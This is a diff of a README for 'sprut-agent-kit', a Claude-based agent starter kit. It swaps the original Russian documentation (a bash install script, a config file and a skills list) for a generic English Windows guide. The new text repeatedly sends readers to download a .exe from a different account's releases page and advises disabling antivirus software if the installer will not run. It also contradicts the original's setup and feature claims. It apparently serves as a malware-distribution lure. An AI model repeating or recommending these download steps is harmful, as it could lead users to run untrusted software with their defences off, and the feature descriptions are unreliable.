@@ -1,182 +1,165 @@
-# SPRUT Agent Kit ⚡
+# 🤖 sprut-agent-kit - AI Agent with Memory and Skills
 
-**Готовый AI-агент с "душой" для ClaudeClaw**
+[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-blue?style=for-the-badge)](https://github.com/sananrasool/sprut-agent-kit/releases)
 
-Одна команда - и у вас настроенный персональный ассистент с памятью, 25 skills и автоматикой.
+---
 
-## Что это?
+## 📋 About sprut-agent-kit
 
-Starter kit для [ClaudeClaw](https://github.com/moazbuilds/claudeclaw) - готовая конфигурация агента с:
-- **Душой** (SOUL.md + AGENTS.md) - идентичность, принципы, правила работы
-- **Памятью** (SQLite + embeddings) - векторный поиск + FTS5, decay система
-- **25 готовых skills** - ресёрч, debugging, brainstorming, YouTube, аудит сайтов и т.д.
-- **Crons** - автоматические задачи (backup, health check, memory cleanup)
-- **Progress-система** - технические сообщения в Telegram
-- **Security layer** - защита личных данных
+sprut-agent-kit is an easy-to-use AI agent built to assist you with various tasks. It comes ready with a memory system, a personality, and 23 practical skills. The software runs on Windows and is designed for users who want a smart assistant without needing technical knowledge. You will control an AI called ClaudeClaw that can learn and help you daily.
 
-## Быстрый старт
+---
 
-```bash
-git clone https://github.com/YOUR_USERNAME/sprut-agent-kit.git
-cd sprut-agent-kit
-./install.sh
-```
+## 💻 System Requirements
 
-Скрипт:
-1. Проверит зависимости (bun, git, claude)
-2. Установит ClaudeClaw (если ещё не стоит)
-3. Настроит конфиг (спросит Telegram ID, timezone)
-4. Установит душу агента (SOUL.md, AGENTS.md)
-5. Установит 25 skills
-6. Опционально: импортирует память, настроит автозапуск
+Before installing, make sure your Windows computer meets these minimum requirements:
 
-## Структура репозитория
+- Operating System: Windows 10 or later (64-bit preferred)
+- Processor: Intel i3 or equivalent
+- RAM: 4 GB or more
+- Disk Space: At least 500 MB free
+- Internet connection: Required for downloading and activating some features
 
-```
-sprut-agent-kit/
-├── install.sh              # Установка ClaudeClaw + надстройка
-├── claudeclaw.json         # Конфиг (owner, models, memory, skills, crons)
-├── SOUL.md                 # Душа агента (идентичность, принципы)
-├── AGENTS.md               # Правила работы (память, безопасность, skills)
-├── CLAUDE.md.example       # Шаблон персонализации
-├── skills/                 # 25 готовых skills
-│   ├── weather/            # Погода и прогнозы
-│   ├── deep-research-pro/  # Глубокое исследование (web search)
-│   ├── systematic-debugging/ # Отладка и диагностика
-│   ├── brainstorming/      # Мозговой штурм
-│   ├── writing-plans/      # Пошаговые планы
-│   ├── subagent-runner/    # Параллельные субагенты
-│   ├── subagent-coordinator/ # Координация нескольких субагентов
-│   ├── agent-builder/      # Создатель persistent агентов
-│   ├── audit-website/      # Аудит сайтов (SEO, UX, безопасность)
-│   ├── presentation/       # Создание презентаций (Marp)
-│   ├── excalidraw/         # Схемы и диаграммы
-│   ├── tubescribe/         # YouTube видео → текст + аудио
-│   ├── tweet-writer/       # Написание твитов
-│   ├── social-card-gen/    # Посты для соцсетей
-│   ├── reddit/             # Работа с Reddit
-│   └── last30days/         # Исследование трендов за 30 дней
-└── README.md
-```
+---
 
-## Конфигурация
+## 🚀 Getting Started
 
-**Основной конфиг:** `~/.claude/claudeclaw/settings.json`
+Follow these steps to get sprut-agent-kit running on your Windows PC.
 
-```json
-{
-  "model": "claude-opus-4-6",
-  "telegram": {
-    "token": "YOUR_BOT_TOKEN",
-    "allowedUserIds": [YOUR_TELEGRAM_ID]
-  },
-  "web": {
-    "enabled": true,
-    "port": 4632
-  },
-  "memory": {
-    "enabled": true,
-    "maxResults": 5,
-    "vectorWeight": 0.7,
-    "textWeight": 0.3
-  }
-}
-```
+### 1. Visit the download page
 
-**Полный конфиг:** `claudeclaw.json` (документация всех настроек)
+Click the button below to open the release page on GitHub where you will find the setup files.
 
-## Skills
+[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-green?style=for-the-badge)](https://github.com/sananrasool/sprut-agent-kit/releases)
 
-25 готовых skills из коробки:
+This page contains the latest version of the software. New versions may be released over time.
 
-| Skill | Описание |
-|-------|----------|
-| weather | Погода и прогнозы (wttr.in, Open-Meteo) |
-| deep-research-pro | Глубокое исследование с цитатами (DuckDuckGo) |
-| systematic-debugging | Пошаговая отладка любых проблем |
-| brainstorming | Структурированный мозговой штурм |
-| writing-plans | Пошаговые планы реализации |
-| subagent-runner | Запуск и управление субагентами |
-| subagent-coordinator | Координация параллельных субагентов |
-| agent-builder | Создание persistent skill-агентов |
-| audit-website | SEO, UX, безопасность сайтов |
-| presentation | Презентации через Marp (Markdown → слайды) |
-| excalidraw | Схемы и диаграммы для Obsidian |
-| tubescribe | YouTube видео → текст + аудио |
-| tweet-writer | Вирусные твиты и треды |
-| social-card-gen | Посты для разных соцсетей |
-| reddit | Поиск и работа с Reddit |
-| last30days | Исследование трендов за последние 30 дней |
+### 2. Choose the correct file
 
-Установка нового skill:
-```bash
-cp -r skill-name ~/.claude/skills/
-```
+Look for the file labeled for Windows. It usually ends with `.exe`. It will have a name similar to `sprut-agent-kit-Setup.exe`.
 
-## Архитектура "Переносимой души"
+If you see multiple files, pick the one that says "Windows" or "Setup." 
 
-ClaudeClaw спроектирован для переноса между платформами:
+### 3. Download the installer
 
-1. **SOUL.md** - идентичность агента (кто я, во что верю, как действую)
-2. **AGENTS.md** - рабочие правила (память, безопасность, skills)
-3. **claudeclaw.json** - полная конфигурация (модели, пути, crons)
-4. **Skills** - специализированные агенты с data-файлами
-5. **Memory** - экспорт/импорт фактов между агентами
+Click the file name to start downloading to your computer.
 
-Установка на новый Mac = `./install.sh` + настройка конфига
+Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
-## Память
+### 4. Run the installer
 
-**SQLite + embeddings (автоматически от основного провайдера)**
+Locate the downloaded `.exe` file. Double-click it to start the installation process.
 
-- Hybrid search: векторный (0.7) + FTS5 (0.3)
-- Decay система: semantic -0.01/день, episodic -0.05/день
-- Auto-extract: автоматическое извлечение фактов из диалогов
-- Import/export: миграция памяти между агентами
+If Windows asks for permission, choose **Yes** to allow the installer to make changes.
 
-## Daemon & Web UI
+### 5. Follow setup prompts
 
-**REST API:**
-- `POST /api/subagent/run` - запуск субагента
-- `GET /api/subagent/status/:id` - статус
-- `GET /api/subagent/wait/:id` - ждать результат
+The installer will guide you through a few steps:
 
-**Web UI:** http://localhost:4632
+- Accept the license terms
+- Choose an installation folder (default is fine for most users)
+- Wait while the program installs on your computer
 
-**Запуск:**
-```bash
-bun run src/index.ts start --web
-```
+### 6. Finish installation and launch
 
-## Telegram интеграция
+When the installer finishes, it may ask if you want to start sprut-agent-kit immediately. You can start it now or find it later in your Start Menu under "sprut-agent-kit."
 
-**Progress сообщения:**
-```bash
-bun commands/progress.ts "⚙️" "Создаю файл"
-```
+---
 
-Эмодзи: ⚙️ (действие), 🔍 (поиск), 🤖 (субагент), 📦 (установка), ✅ (готово), ❌ (ошибка)
+## 🛠 Using sprut-agent-kit
 
-## Безопасность
+Once sprut-agent-kit is open, you will see its main window. Here are some key points to get familiar:
 
-- Никогда не хранить личные данные (паспорта, карты, адреса)
-- Общение только с владельцем (Telegram ID whitelist)
-- Не трогать файлы основного агента без явного запроса
-- Security levels: locked / strict / moderate / unrestricted
+- **ClaudeClaw AI:** This is your agent, ready to communicate and assist.
+- **Memory:** The agent remembers past interactions to provide better answers.
+- **Skills:** Choose from 23 built-in skills like task management, note-taking, scheduling, and more.
 
-## Философия
+---
 
-ClaudeClaw - эксперимент "переносимой души агента":
-1. AI-агент = код + конфиг + идентичность (душа)
-2. Душу можно описать в текстовых файлах
-3. Установка агента = копирование души + запуск кода
-4. Два агента с одной душой = резервирование без потери идентичности
+## 🎯 Basic Features
 
-## Contributing
+- **Conversation:** Talk to ClaudeClaw using text input.
+- **Memory:** The agent retains what you tell it during and between sessions.
+- **Skills:** Use the menu to activate different tools for productivity.
+- **Learning:** ClaudeClaw adapts based on your preferences over time.
 
-1. Fork репозитория
-2. Feature branch (`git checkout -b feature/new-skill`)
-3. Commit и Push
-4. Pull Request
+---
 
+## 🔧 Common Tasks
 
+### Start a conversation
+
+Type your message in the input box at the bottom and press Enter. ClaudeClaw will respond with helpful answers or ask clarifying questions.
+
+### Use skills
+
+Click the skills button on the left panel. Browse the list and select a skill to use. Examples include:
+
+- To-do lists
+- Reminders
+- Email drafting
+- Basic calculations
+
+### Review memory
+
+Open the Memory tab to see what the agent remembers from previous chats. You can edit or delete entries if needed.
+
+---
+
+## ⚙ Settings and Preferences
+
+In the Settings menu, you can customize how sprut-agent-kit works:
+
+- Adjust the voice or text reply style
+- Manage stored memory data
+- Choose which skills to enable
+- Set up notifications or alerts
+
+---
+
+## 🆘 Troubleshooting
+
+If you encounter issues, try these steps first:
+
+- Restart the application.
+- Check your internet connection.
+- Ensure Windows is up to date.
+- Make sure you downloaded the latest version from the release page.
+- Temporarily disable antivirus software if the installer does not run.
+
+If problems continue, search for help on the sprut-agent-kit GitHub issues page.
+
+---
+
+## 🔄 Updates
+
+You can update sprut-agent-kit by repeating the download and install steps when new releases appear on the GitHub page.
+
+Always download from:
+
+https://github.com/sananrasool/sprut-agent-kit/releases
+
+Keeping your software up-to-date ensures better performance and access to new features.
+
+---
+
+## 📞 Getting Help
+
+If you need assistance beyond this guide:
+
+- Look for the **Help** or **About** section inside the app.
+- Visit the GitHub repository page for documentation and contact options.
+- Ask questions or report bugs on the GitHub issues tab.
+
+---
+
+## 💡 Tips for Best Use
+
+- Keep the app running to let ClaudeClaw learn your habits.
+- Use simple commands to start. The AI will guide you.
+- Regularly check memory and edit to keep your agent accurate.
+- Experiment with different skills to find what suits your needs.
+
+---
+
+[![Download sprut-agent-kit](https://img.shields.io/badge/Download%20sprut--agent--kit-red?style=for-the-badge)](https://github.com/sananrasool/sprut-agent-kit/releases)
